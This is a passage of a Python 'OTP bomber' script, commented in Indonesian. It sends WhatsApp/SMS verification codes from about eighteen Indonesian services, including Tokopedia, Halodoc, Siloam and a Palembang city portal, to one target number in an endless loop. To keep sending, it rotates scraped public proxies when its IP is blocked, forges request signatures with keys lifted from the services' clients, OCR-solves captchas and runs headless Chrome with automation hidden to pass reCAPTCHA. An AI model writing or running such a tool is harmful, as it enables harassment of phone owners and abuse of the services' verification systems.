#!/usr/bin/env python3
"""
otp.py v2 - WhatsApp OTP sender, loop tanpa batas sampai Ctrl+C.

    python otp.py                     -> menu
    python otp.py --list              -> tabel lane
    python otp.py --probe             -> tes semua lane (1 putaran)
    python otp.py --probe --only cmk  -> 1 lane saja
    python otp.py --once 083872681761 -> 1 putaran lalu keluar
    python otp.py --loop 083872681761 -> loop sampai Ctrl+C

Status:
  SENT     server bilang terkirim
  COOLDOWN server bilang tunggu / sudah dikirim
  GATED    endpoint hidup tapi masih ketahan gate (token/signature/schema)
  FAIL     ditolak / error
"""
from __future__ import annotations
import os
import re
import json
import base64
import sys
import time
import uuid
import hmac
import random
import hashlib
import secrets
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    os.system(f"{sys.executable} -m pip install requests")
    import requests

EMAIL = os.environ.get("OTP_EMAIL", "jejakseo32221@gmail.com")
FULLNAME = os.environ.get("OTP_NAME", "Budi Santoso")
MAX_BULK = 10

UA_POOL = [
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
]

LOCK = threading.Lock()
TOTAL = 0
VERBOSE = os.environ.get("OTP_VERBOSE", "").strip().lower() in ("1", "true", "on", "yes")


def _c(code):
    if not sys.stdout.isatty():
        return ""
    return {"g": "\033[92m", "y": "\033[93m", "r": "\033[91m",
            "b": "\033[96m", "w": "\033[97m", "x": "\033[0m"}.get(code, "")


def say(msg="", code=""):
    print(f"{_c(code)}{msg}{_c('x')}", flush=True)


# ---------------------------------------------------------------- nomor
def normalize(n):
    n = re.sub(r"\D", "", str(n))
    if n.startswith("62"):
        n = "0" + n[2:]
    elif n.startswith("8"):
        n = "0" + n
    if not n.startswith("08") or not (10 <= len(n) <= 14):
        return None
    return (n, "62" + n[1:], n[1:], "+62" + n[1:])


class Ctx:
    def __init__(self, raw):
        v = normalize(raw)
        if not v:
            raise ValueError(f"nomor tidak valid: {raw}")
        self.p08, self.p62, self.pnc, self.pplus = v
        self.devid = str(uuid.uuid4())

    def ua(self):
        return random.choice(UA_POOL)

    def hdr(self, extra=None):
        h = {"User-Agent": self.ua(),
             "Accept": "application/json, text/plain, */*",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8"}
        if extra:
            h.update(extra)
        return h


# ---------------------------------------------------------------- judge
COOL_NEG = ("cooldown", "min_interval", "melebihi batas", "melebih batas",
            "sudah melakukan", "sudah dikirim", "tunggu", "terlalu sering",
            "too many", "rate limit", "next_request_in_second", "maksimal",
            "harap tunggu", "try again in")
NEG = ("invalid", "gagal", "forbidden", "unauthorized", "missing",
       "required", "not found", "are you a bot", "signature mismatch",
       "absent", "mismatch", "wrong type", "not in indonesian format")


def verdict(status, body, ok_codes=(200, 201, 202)):
    b = (body or "").lower()
    if status == 429:
        return "COOLDOWN"
    if any(k in b for k in COOL_NEG):
        return "COOLDOWN"
    if status in ok_codes:
        if any(k in b for k in NEG):
            return "FAIL"
        return "SENT"
    return "FAIL"


def has(body, *markers):
    low = (body or "").lower()
    return all(m.lower() in low for m in markers)


# ================================================================ LANE
# 1. Kredit Pintar
def lp_kreditpintar(c):
    r = requests.post(
        "https://go.kreditpintar.com/api/auth/send-code",
        headers=c.hdr({"Content-Type": "application/json",
                       "Origin": "https://www.kreditpintar.com",
                       "Referer": "https://www.kreditpintar.com/"}),
        json={"mobileNumber": c.p08}, timeout=15)
    if r.status_code == 200 and "batchNo" in r.text:
        return "SENT", "batchNo"
    if "OTP_MIN_INTERVAL_LIMIT" in r.text or "telah dikirim" in r.text:
        return "COOLDOWN", "interval"
    if "MAX_RETRY_COUNT_REACHED_TRY_TOMORROW" in r.text:
        return "COOLDOWN", "kuota harian habis (besok)"
    return "FAIL", r.text[:70]


# 2. Tokopedia
def lp_tokopedia(c):
    s = requests.Session()
    s.headers.update(c.hdr())
    page = ("https://accounts.tokopedia.com/otp/c/page?otp_type=116"
            f"&msisdn={c.p08}"
            "&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone"
            f"%26phone%3D{c.p08}%26status%3DeyJrIj...NlfQ%253D%253D")
    try:
        r1 = s.get(page, timeout=15)
    except Exception:
        return "FAIL", "page"
    m = re.search(r'<input\s+id="Token"\s+value="(.*?)"\s*type="hidden"', r1.text)
    if not m:
        return "FAIL", "no token"
    r2 = s.post(
        "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
        headers={"Origin": "https://accounts.tokopedia.com",
                 "Accept": "application/json",
                 "X-Requested-With": "XMLHttpRequest",
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data={"otp_type": "116", "msisdn": c.p08, "tk": m.group(1),
              "email": EMAIL, "original_param": "", "user_id": "",
              "signature": "", "number_otp_digit": "6"}, timeout=15)
    body = r2.text
    if r2.status_code == 200 and '"success":true' in body.replace(" ", ""):
        return "SENT", "ok"
    low = body.lower()
    if "sudah melakukan" in low or "menit" in low:
        return "COOLDOWN", "kuota"
    return "FAIL", body[:70]


# 3. Dunia Games
def lp_duniagames(c):
    r = requests.post(
        "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
        headers=c.hdr({"Content-Type": "application/json",
                       "Origin": "https://duniagames.co.id",
                       "x-device": c.devid}),
        json={"phoneNumber": c.pplus, "userName": c.pnc}, timeout=15)
    return verdict(r.status_code, r.text), r.text[:70]


def _proxies(name=""):
    """Proxy dari env: OTP_PROXY_<LANE> menang, lalu OTP_PROXY global.
    Format: http://user:pass@host:port  atau socks5://host:port."""
    for key in (f"OTP_PROXY_{name.upper()}", "OTP_PROXY"):
        v = os.environ.get(key, "").strip()
        if v:
            return {"http": v, "https": v}
    return None


# 4. IRA Internet Rakyat — auto-proxy kalau IP diblok
_IRA_POOL = {"good": [], "ts": 0.0, "direct_blocked": 0.0}
_IRA_PROXY_TTL = 600


def _autoproxy_on():
    v = os.environ.get("OTP_AUTOPROXY", "1").strip().lower()
    return v not in ("0", "false", "off", "no")


def _proxy_candidates(limit=250):
    """Daftar kandidat proxy: OTP_PROXY_LIST (dipisah koma/spasi/baris, atau URL)
    kalau ada, kalau tidak ambil dari proxyscrape."""
    raw = os.environ.get("OTP_PROXY_LIST", "").strip()
    txt = raw
    if raw.startswith("http"):
        try:
            txt = requests.get(raw, timeout=15,
                               headers={"User-Agent": "curl/8"}).text
        except Exception:
            return []
    if txt:
        parts = re.split(r"[,\s;]+", txt)
        return [x for x in parts if x.count(":") == 1][:limit]
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies"
                         "&protocol=http&timeout=10000&country=all&ssl=yes"
                         "&anonymity=all", timeout=20,
                         headers={"User-Agent": "curl/8"})
        return [x.strip() for x in r.text.splitlines()
                if x.count(":") == 1][:limit]
    except Exception:
        return []


def _proxy_ok(proxy, host, timeout=9):
    px = {"http": "http://" + proxy, "https": "http://" + proxy}
    try:
        r = requests.get("https://" + host + "/", proxies=px, timeout=timeout,
                         headers={"User-Agent": random.choice(UA_POOL)})
        return proxy if r.status_code < 500 else None
    except Exception:
        return None


def _find_ira_proxies(host, need=3):
    """Saring proxy publik sampai ketemu `need` yang bisa buka `host`."""
    cand = _proxy_candidates()
    if not cand:
        return []
    good = []
    with ThreadPoolExecutor(max_workers=40) as ex:
        futs = [ex.submit(_proxy_ok, p, host) for p in cand]
        for f in as_completed(futs):
            r = f.result()
            if r:
                good.append(r)
                if len(good) >= need:
                    for x in futs:
                        x.cancel()
                    break
    return good


def _ira_post(host, c, proxy=None):
    """POST OTP IRA. Return (status_code, body). Raise kalau jaringan gagal."""
    px = {"http": "http://" + proxy, "https": "http://" + proxy} if proxy else None
    r = requests.post("https://" + host + "/api/app/auth/send-otp-register",
                      headers=c.hdr({"Host": host,
                                     "Content-Type": "application/json",
                                     "x-api-key": "280999!FTTH",
                                     "Origin": "https://" + host}),
                      json={"phone_number": c.p08}, timeout=8, proxies=px)
    return r.status_code, r.text


def _ira_verdict(code, body):
    if "Maksimal pengiriman OTP" in body:
        return "COOLDOWN", "kuota 3x/hari per nomor"
    if "OTP terkirim" in body or (200 <= code < 300):
        return "SENT", "OTP terkirim"
    return verdict(code, body), body[:70]


def lp_ira(c):
    """Langsung dulu; kalau IP diblok, otomatis pindah ke proxy publik."""
    host = os.environ.get("OTP_IRA_HOST", "internetrakyat.id").strip()
    fixed = _proxies("ira")
    if fixed:
        p = fixed["https"].replace("http://", "").replace("https://", "")
        try:
            return _ira_verdict(*_ira_post(host, c, p))
        except Exception:
            return "GATED", "proxy OTP_PROXY_IRA gagal"
    # kalau 10 menit terakhir jalur langsung sudah terbukti diblok, jangan buang 4s lagi
    if time.time() - _IRA_POOL["direct_blocked"] > 600:
        try:
            return _ira_verdict(*_ira_post(host, c))
        except Exception:
            _IRA_POOL["direct_blocked"] = time.time()
    if not _autoproxy_on():
        return "GATED", "host tak terjangkau (autoproxy mati)"

    now = time.time()
    if now - _IRA_POOL["ts"] > _IRA_PROXY_TTL or not _IRA_POOL["good"]:
        got = _find_ira_proxies(host, need=3)
        _IRA_POOL.update(good=got, ts=now)
        if not got:
            return "GATED", "host blokir + proxy publik habis"
    for p in list(_IRA_POOL["good"]):
        try:
            res = _ira_verdict(*_ira_post(host, c, p))
        except Exception:
            continue
        _IRA_POOL["good"].remove(p)
        _IRA_POOL["good"].insert(0, p)      # proxy yang jalan jadi prioritas
        return res
    _IRA_POOL["good"] = []
    _IRA_POOL["ts"] = 0.0
    return "GATED", "host blokir + proxy publik habis"


# 5. Redbus
def lp_redbus(c):
    r = requests.get(
        "https://m.redbus.id/api/getOtp",
        headers=c.hdr({"Origin": "https://m.redbus.id",
                       "Referer": "https://m.redbus.id/"}),
        params={"number": c.pnc, "cc": "62", "whatsAppOpted": "True"},
        timeout=15)
    if has(r.text, "OTP Sent Successfully"):
        return "SENT", "otp sent"
    return verdict(r.status_code, r.text), r.text[:70]


# 6. Sofia BM Secure
def lp_sofia(c):
    r = requests.post(
        "https://sofia.bmsecure.id/central-api/sc-api/otp/generate",
        headers=c.hdr({"Content-Type": "application/json",
                       "Origin": "https://sofia.bmsecure.id"}),
        json={"phone_user": c.p08}, timeout=15)
    if '"rc":"00"' in r.text.replace(" ", ""):
        return "SENT", "rc 00"
    if "next_request_in_second" in r.text:
        return "COOLDOWN", "next_request"
    return verdict(r.status_code, r.text), r.text[:70]


# 7. Vidio
def lp_vidio(c):
    r = requests.post(
        "https://api.vidio.com/otp/send",
        headers=c.hdr({"Content-Type": "application/json",
                       "Origin": "https://www.vidio.com",
                       "Referer": "https://www.vidio.com/"}),
        json={"msisdn": c.p62}, timeout=15)
    if has(r.text, "melebih batas"):
        return "COOLDOWN", "10 menit"
    if "10000001" in r.text:
        return "FAIL", "nomor tidak terdaftar di Vidio"
    return verdict(r.status_code, r.text), r.text[:70]


# 8. CMK Club  (BARU - verified: OTP has been sent to ***778)
def lp_cmk(c):
    s = requests.Session()
    s.headers.update(c.hdr())
    try:
        g = s.get("https://member.cmkclub.com/", timeout=20)
    except Exception as e:
        return "FAIL", type(e).__name__
    m = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', g.text)
    if not m:
        return "FAIL", "no csrf"
    r = s.post("https://member.cmkclub.com/validate-mobile-number",
               headers={"Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://member.cmkclub.com",
                        "Referer": "https://member.cmkclub.com/",
                        "User-Agent": c.ua()},
               data={"csrfmiddlewaretoken": m.group(1),
                     "mobile_number": c.p08}, timeout=20)
    if "otp_number" in r.text or "OTP has been sent" in r.text:
        return "SENT", "sent (halaman input OTP)"
    return verdict(r.status_code, r.text), r.text[:70]


# 9. Rappi  (BARU - verified 200 success:true)
def lp_rappi(c):
    url = ("https://services.rappi.com/api/rappi-authentication/"
           "login/whatsapp/create")
    r = requests.post(url,
                      headers=c.hdr({"Content-Type": "application/json",
                                     "Origin": "https://www.rappi.com",
                                     "app-co": "rappi"}),
                      json={"phone": c.pnc, "country_code": "+62"}, timeout=20)
    if r.status_code == 200 and '"success":true' in r.text.replace(" ", ""):
        return "SENT", "success"
    if "retry_after_seconds" in r.text:
        return "COOLDOWN", "retry_after"
    if "invalid_data" in r.text:
        return "FAIL", "telefono invalido"
    return verdict(r.status_code, r.text), r.text[:70]


# 10. Adira (02002 = butuh field 'type')
def lp_adira(c):
    """Format nomor dicoba semua: 08xx, +62xx, 8xx, 62xx.
    02070 = format belum Indonesia; 02002 = field lain yang salah tipe."""
    last = ("", "")
    for ph in (c.p08, c.pplus, c.pnc, c.p62):
        r = requests.post(
            "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
            headers=c.hdr({"Content-Type": "application/json",
                           "Origin": "https://adiraku.co.id",
                           "Referer": "https://adiraku.co.id/"}),
            json={"mobileNumber": ph}, timeout=15)
        last = (r.status_code, r.text)
        if r.status_code < 300:
            return "SENT", r.text[:40]
        if "02002" in r.text:
            continue                      # lolos cek format, gagal di field lain
        if "02070" in r.text:
            continue
        time.sleep(1)
    if "02002" in last[1]:
        return "GATED", "format OK, field lain salah tipe (02002)"
    return verdict(last[0], last[1]), last[1][:70]


# 11. MAPCLUB (SOLVED) - guest JWT dari /api/auth/token, prefix tanpa '+'
_MC_TOKEN = {"v": "", "t": 0.0}


def _mapclub_token():
    now = time.time()
    if _MC_TOKEN["v"] and now - _MC_TOKEN["t"] < 1200:
        return _MC_TOKEN["v"]
    r = requests.get("https://beryllium.mapclub.com/api/auth/token",
                     headers={"User-Agent": random.choice(UA_POOL),
                              "Accept": "application/json, text/plain, */*",
                              "Origin": "https://www.mapclub.com",
                              "Referer": "https://www.mapclub.com/member/register"},
                     timeout=20)
    tok = r.json()["data"][0]["accessToken"]
    _MC_TOKEN.update(v=tok, t=now)
    return tok


def lp_mapclub(c):
    tok = _mapclub_token()
    r = requests.post(
        "https://beryllium.mapclub.com/api/member/registration/sms/otp"
        "?channel=WHATSAPP",
        headers={"User-Agent": random.choice(UA_POOL),
                 "Accept": "application/json, text/plain, */*",
                 "Content-Type": "application/json",
                 "Origin": "https://www.mapclub.com",
                 "Referer": "https://www.mapclub.com/member/register",
                 "Authorization": "Bearer " + tok,
                 "client-platform": "WEB",
                 "Client-Timestamp": str(int(time.time() * 1000))},
        json={"account": c.pnc, "prefix": "62"}, timeout=25)
    body = r.text
    if '"success":true' in body.replace(" ", ""):
        return "SENT", "timeRemaining 60000"
    if "INTERNATIONAL_PREFIX_NOT_FOUND" in body:
        return "FAIL", "prefix harus 62 tanpa +"
    if "BAD_REQUEST" in body:
        return "GATED", "token/header guest hilang"
    return verdict(r.status_code, body), body[:70]


# 12. Halodoc (SOLVED) - clientToken = HMAC_SHA256(hmacKey, visitorId), clientId = visitorId
_HD_KEY = b"2v3o8tsoawcvujzk3nqvkznq7ic6z9bw"
_HD_URL = ("https://www.halodoc.com/magneto-api/v2/users/"
           "authentication/otp/requests")


def lp_halodoc(c):
    s = requests.Session()
    s.headers.update(c.hdr({"Accept": "application/json, text/plain, */*",
                           "Origin": "https://www.halodoc.com",
                           "Referer": "https://www.halodoc.com/"}))
    s.get("https://www.halodoc.com/", timeout=20)
    vid = secrets.token_hex(16)
    ct = hmac.new(_HD_KEY, vid.encode(), hashlib.sha256).hexdigest()
    s.get(_HD_URL + "?clientToken=" + ct, timeout=20)      # 204 = token pair sah
    xs = s.cookies.get("XSRF-TOKEN") or ""
    r = s.post(_HD_URL,
               headers={"Content-Type": "application/json",
                        "x-xsrf-token": xs},
               json={"phone_number": c.pplus, "channel": "whatsapp",
                     "otp_resent": False, "clientId": vid}, timeout=25)
    body = r.text
    if '"code":"1002"' in body.replace(" ", "") or r.status_code == 429:
        return "COOLDOWN", "limit per nomor (1002/429)"
    if "11016" in body:
        return "GATED", "clientToken ditolak"
    if r.status_code in (200, 201, 202):
        return "SENT", body[:40]
    return verdict(r.status_code, body), body[:70]


# 13. Siloam (SOLVED) - plain JSON, tanpa enkripsi. type=whatsapp wajib.
def lp_siloam(c):
    r = requests.post(
        "https://mysiloam-api.siloamhospitals.com/user/v1/auth-new/whatsapp/send-code",
        headers=c.hdr({"Content-Type": "application/json",
                       "Accept": "application/json, text/plain, */*",
                       "x-lang": "id",
                       "x-siloam-source": "website",
                       "Origin": "https://www.siloamhospitals.com",
                       "Referer": "https://www.siloamhospitals.com/"}),
        json={"phoneNumber": c.p08, "countryCode": "62", "type": "whatsapp"},
        timeout=20)
    if '"status":"Success"' in r.text.replace(" ", ""):
        return "SENT", "Success"
    if "50509" in r.text or "Max attempt" in r.text:
        return "COOLDOWN", "max attempt (50509)"
    return verdict(r.status_code, r.text), r.text[:70]


# 14. Segari (SOLVED) - token dari /v1/auth/init, sig = HMAC_SHA256(token, ts\nuuid\nMETHOD)
_SG_API = "https://api-v2.segari.id"
_SG_TOK = {"v": "", "t": 0.0}
_SG_UA = ("Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36")


def _segari_token():
    now = time.time()
    if _SG_TOK["v"] and now - _SG_TOK["t"] < 180:      # client cache 240s
        return _SG_TOK["v"]
    r = requests.get(_SG_API + "//v1/auth/init",
                     headers={"User-Agent": _SG_UA,
                              "accept": "application/json, text/plain, */*",
                              "origin": "https://segari.id",
                              "referer": "https://segari.id/"},
                     timeout=20)
    tok = r.json()["data"]["token"]
    _SG_TOK.update(v=tok, t=now)
    return tok


def _tess_bin():
    import shutil
    p = shutil.which("tesseract")
    if p:
        return p
    for c in (r"C:\Program Files\Tesseract-OCR\tesseract.exe",
              r"C:\Program Files (x86)\Tesseract-OCR\tesseract.exe"):
        if os.path.exists(c):
            return c
    return None


def _solver_bin():
    """Interpreter + skrip ddddocr (butuh onnxruntime).
    Windows: py -3.13. Termux/Linux: python yang lagi jalan (kalau ddddocr ada)."""
    import shutil
    here = os.path.dirname(os.path.abspath(__file__))
    script = os.path.join(here, "solve_cap.py")
    if not os.path.exists(script):
        return None
    for cand in (["py", "-3.13"], ["py", "-3.12"], ["py", "-3.11"]):
        if shutil.which(cand[0]):
            return cand + [script]
    try:
        import ddddocr  # noqa: F401
    except Exception:
        return None
    return [sys.executable, script]


def _ocr_captcha(raw):
    """Captcha Segari (alnum, 5-7 char) -> kandidat unik, urut paling masuk akal.
    Kanal biru dipakai karena glyph captcha-nya berwarna, bukan hitam."""
    try:
        from PIL import Image, ImageOps, ImageFilter
    except ImportError:
        return []
    import io
    import subprocess
    im0 = Image.open(io.BytesIO(raw))
    WL = ("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
          "abcdefghijklmnopqrstuvwxyz0123456789")
    cands = []
    solver = _solver_bin()
    if solver:
        try:
            tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "_cap_solve.png")
            with open(tmp, "wb") as f:
                f.write(raw)
            out = subprocess.run(solver + [tmp], capture_output=True,
                                 text=True, timeout=60).stdout.strip()
            out = re.sub(r"\s", "", out)
            if 4 <= len(out) <= 8:
                cands.append(out)
        except Exception:
            pass
    tess = _tess_bin()
    if not tess:
        return cands
    bases = [("L", im0.convert("L")),
             ("blue", ImageOps.autocontrast(im0.split()[2]))]
    for _, b in bases:
        for scale in (4, 6):
            g = ImageOps.autocontrast(
                b.resize((b.width * scale, b.height * scale), Image.LANCZOS))
            for op in ("none", "close", "med3"):
                if op == "close":
                    img = g.filter(ImageFilter.MaxFilter(3)).filter(
                        ImageFilter.MinFilter(3))
                elif op == "med3":
                    img = g.filter(ImageFilter.MedianFilter(3))
                else:
                    img = g
                for th in (None, 190):
                    im2 = img if th is None else img.point(
                        lambda p: 0 if p < th else 255)
                    im2.save("_cap.png")
                    for psm in ("7", "8"):
                        txt = subprocess.run(
                            [tess, "_cap.png", "stdout", "--psm", psm,
                             "-c", "tessedit_char_whitelist=" + WL],
                            capture_output=True, text=True).stdout
                        txt = re.sub(r"\s", "", txt)
                        if 4 <= len(txt) <= 8 and txt not in cands:
                            cands.append(txt)
    cands.sort(key=lambda t: (abs(len(t) - 5), -len(t)))
    return cands


def _sg_hdr(tok, pathname="/login"):
    """Header Segari baru tiap request: signature terikat timestamp (jendela pendek)."""
    ts = str(int(time.time()))
    n = str(uuid.uuid4())
    msg = ts + "\n" + n + "\nPOST"
    sig = hmac.new(tok.encode(), msg.encode(),
                   hashlib.sha256).hexdigest()
    return {"User-Agent": _SG_UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://segari.id",
            "referer": "https://segari.id/",
            "x-segari-timestamp": ts,
            "x-segari-n": n,
            "x-segari-t": tok,
            "x-segari-signature": sig,
            "x-segari-platform": "web",
            "x-segari-pathname": pathname,
            "x-client-id": "e818bcf35b90a6c3223b19dc6fa04224ee76671cb30c6374c5ebb3712beac638",
            "x-client-info": base64.b64encode(json.dumps(
                {"platform": "Win32", "language": "en-US",
                 "webdriver": ""}, separators=(",", ":")).encode()).decode()}


def lp_segari(c):
    tok = _segari_token()
    r = requests.post(_SG_API + "//v1/otps/generate", headers=_sg_hdr(tok),
                      json={"phoneNumber": c.p08}, timeout=25)
    body = r.text
    if '"strategy":"whatsapp"' in body:
        return "SENT", "strategy whatsapp"
    if "OTP-0003" in body or "Silakan tunggu" in body:
        m = re.search(r"tunggu (\d+) detik", body)
        return "COOLDOWN", (m.group(1) + "s" if m else "cooldown")
    if "OTP-0004" in body or "CAPTCHA" in body.upper():
        for _ in range(6):                      # captcha: ambil gambar, OCR, kirim ulang
            cd = requests.post(_SG_API + "//v1/otps/captcha",
                               headers=_sg_hdr(tok),
                               json={"phoneNumber": c.p08}, timeout=25)
            if cd.status_code != 200:
                return "GATED", f"captcha HTTP {cd.status_code}"
            d = cd.json()["data"]
            raw = base64.b64decode(d["imageBase64"])
            for ans in _ocr_captcha(raw)[:6]:
                rr = requests.post(
                    _SG_API + "//v1/otps/generate", headers=_sg_hdr(tok),
                    json={"phoneNumber": c.p08,
                          "captchaChallengeId": d["challengeId"],
                          "captchaAnswer": ans}, timeout=25)
                if rr.status_code == 200:
                    return "SENT", "captcha " + ans
                if "OTP-0005" not in rr.text and "OTP-0004" not in rr.text:
                    return "GATED", rr.text[:60]
            time.sleep(1)
        return "GATED", "captcha OCR gagal 6x"
    if "Signature Mismatch" in body:
        return "GATED", "signature ditolak"
    return verdict(r.status_code, body), body[:70]


# 15. Auto2000 (401 = butuh token)
def lp_auto2000(c):
    r = requests.post(
        "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp",
        headers=c.hdr({"Content-Type": "application/json",
                       "Origin": "https://auto2000.co.id",
                       "Referer": "https://auto2000.co.id/"}),
        json={"phoneNumber": c.p62}, timeout=15)
    if "max otp request" in r.text.lower() or "nextValidAttempt" in r.text:
        m = re.search(r"(\d+)\s*second", r.text)
        return "COOLDOWN", (m.group(1) + "s" if m else "limit")
    if r.status_code == 401:
        return "GATED", "butuh system token"
    if r.status_code < 300:
        return "SENT", r.text[:40]
    return verdict(r.status_code, r.text), r.text[:70]


# 18. Mister Aladin (register pakai OTP; request OTP diblok di luar IP Indonesia)
def lp_misteraladin(c):
    url = ("https://www.misteraladin.com/api/members/v2/auth/otp/request")
    h = c.hdr({"Content-Type": "application/json",
               "Accept": "application/json, text/plain, */*",
               "Origin": "https://www.misteraladin.com",
               "Referer": "https://www.misteraladin.com/register"})
    body = {"phone_number_country_code": "62", "phone_number": c.pnc,
            "source": "manual"}
    try:
        r = requests.post(url, headers=h, json=body, timeout=20,
                          proxies=_proxies("misteraladin"))
    except Exception as e:
        return "FAIL", type(e).__name__
    t = r.text
    if "Block OTP Except ID" in t:
        return "GATED", "butuh IP Indonesia (Block OTP Except ID)"
    if r.status_code in (200, 201, 202, 204):
        return "SENT", t[:40] or "204"
    if r.status_code == 429 or "too many" in t.lower():
        return "COOLDOWN", "limit"
    return verdict(r.status_code, t), t[:70]


# 17. SIDEMANG Pemkot Palembang (+62 821-2020-9721) - gate reCAPTCHA invisible
def _sidemang_browser(phone):
    """Kirim lewat form asli (Chrome + reCAPTCHA v2 checkbox).
    Token v2 sekali pakai, jadi tiap kirim = satu sesi browser.
    Balikin (status, detail) atau None kalau browser tidak tersedia."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return None
    PAGE = "https://sidemang.palembang.go.id/lambidaro/register-otp"
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
    got = {}

    def _resp(r):
        if "send-otp" in r.url and r.request.method == "POST":
            try:
                got["body"] = r.text()
                got["status"] = r.status
            except Exception:
                pass

    try:
        with sync_playwright() as pw:
            try:
                b = pw.chromium.launch(channel="chrome", headless=True, args=[
                    "--no-sandbox",
                    "--disable-blink-features=AutomationControlled"])
            except Exception:
                b = pw.chromium.launch(headless=True, args=["--no-sandbox"])
            c = b.new_context(user_agent=UA, locale="id-ID",
                              viewport={"width": 1280, "height": 900})
            c.add_init_script(
                "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
            p = c.new_page()
            p.on("response", _resp)
            p.goto(PAGE, wait_until="networkidle", timeout=60000)
            p.wait_for_timeout(2500)
            p.fill("input[type=tel]", phone)
            try:
                p.fill("input[type=email]", EMAIL)
            except Exception:
                pass
            p.wait_for_timeout(500)
            try:
                p.click("button[type=submit]", timeout=8000)
            except Exception:
                p.evaluate(
                    "(()=>{const b=[...document.querySelectorAll('button')]"
                    ".find(e=>/kirim/i.test(e.innerText));if(b)b.click();})()")
            for _ in range(24):
                if got.get("body"):
                    break
                p.wait_for_timeout(1000)
            b.close()
    except Exception as e:
        return "FAIL", f"browser: {type(e).__name__}"

    body = got.get("body") or ""
    st = got.get("status")
    if '"otpDispatched":true' in body:
        return "SENT", "otpDispatched (whatsapp)"
    if "OTP_STILL_ACTIVE" in body:
        return "COOLDOWN", "otp masih aktif"
    if not body:
        return "GATED", "captcha belum lolos (challenge)"
    if "RECAPTCHA" in body:
        return "GATED", "captcha ditolak"
    return verdict(st or 0, body), body[:60]


def lp_sidemang(c):
    """Endpoint dari bundle Next.js /lambidaro/register-otp.
    Body asli: {phoneNumber, app:'lambidaro', email, recaptchaToken}
    Gate: reCAPTCHA v2 checkbox, sitekey 6LdDoWwtAAAAAM2Wcnn7AXmqEzgQcsu1nRNCTE5Y.
    Dua jalur: (a) SIDEMANG_CAPTCHA=<token> -> POST langsung,
               (b) browser form-driver (Chrome/playwright) -> otomatis.
    """
    tok = os.environ.get("SIDEMANG_CAPTCHA", "").strip()
    if not tok:
        if os.environ.get("OTP_NO_BROWSER", "") == "1":
            return "GATED", "butuh captcha (v2 checkbox) — browser dimatikan"
        res = _sidemang_browser(c.p08)
        if res is None:
            return "GATED", "butuh captcha (playwright tidak ada)"
        return res
    r = requests.post(
        "https://sidemang.palembang.go.id/api/users/register/send-otp",
        headers=c.hdr({"Content-Type": "application/json",
                       "Origin": "https://sidemang.palembang.go.id",
                       "Referer": "https://sidemang.palembang.go.id/lambidaro/register-otp"}),
        json={"phoneNumber": c.p08, "app": "lambidaro",
              "email": EMAIL, "recaptchaToken": tok}, timeout=20)
    if "RECAPTCHA_REQUIRED" in r.text:
        return "GATED", "captcha kosong/ditolak"
    if "RECAPTCHA_INVALID" in r.text:
        return "GATED", "captcha invalid"
    if r.status_code < 300 and "otpDispatched" in r.text:
        return "SENT", "otpDispatched"
    if r.status_code < 300:
        return "SENT", r.text[:40]
    return verdict(r.status_code, r.text), r.text[:70]


# 16. Moladin (off by default)
def lp_moladin(c):
    r = requests.post(
        "https://moladin.com/wp-json/api/v1/request_otp",
        headers=c.hdr({"Content-Type": "application/json",
                       "Origin": "https://moladin.com",
                       "Referer": "https://moladin.com/"}),
        json={"whatsapp_number": c.p08, "full_name": FULLNAME}, timeout=15)
    if "reCAPTCHA" in r.text:
        return "FAIL", "butuh recaptcha"
    return verdict(r.status_code, r.text), r.text[:70]


# ---------------------------------------------------------------- tabel
# (nama, fungsi, jeda detik, aktif)
ENDPOINTS = [
    ("kreditpintar", lp_kreditpintar, 300, True),
    ("tokopedia",    lp_tokopedia,    300, True),
    ("duniagames",   lp_duniagames,    90, True),
    ("ira",          lp_ira,          120, True),
    ("redbus",       lp_redbus,       180, True),
    ("sofia",        lp_sofia,         90, True),
    ("vidio",        lp_vidio,        600, False),
    ("cmk",          lp_cmk,          120, True),
    ("rappi",        lp_rappi,         60, True),
    ("halodoc",      lp_halodoc,      300, True),
    ("adira",        lp_adira,        300, True),
    ("mapclub",      lp_mapclub,      300, True),
    ("siloam",       lp_siloam,       300, True),
    ("segari",       lp_segari,       300, True),
    ("auto2000",     lp_auto2000,     600, True),
    ("sidemang",     lp_sidemang,     300, True),
    ("moladin",      lp_moladin,      240, False),
    ("misteraladin", lp_misteraladin, 300, True),
]

GATED_NAMES = {"adira"}


def pick_lanes(include_gated=True):
    return [e for e in ENDPOINTS if e[3] or include_gated]


# ---------------------------------------------------------------- worker
class Worker:
    def __init__(self, raw_phone, stop_event, lanes, target=None):
        self.ctx = Ctx(raw_phone)
        self.label = self.ctx.p08
        self.stop = stop_event
        self.lanes = lanes
        self.target = target
        self.sent = 0
        self.attempt = 0
        self.cool = {}
        self.per = {n: {"SENT": 0, "COOLDOWN": 0, "GATED": 0, "FAIL": 0}
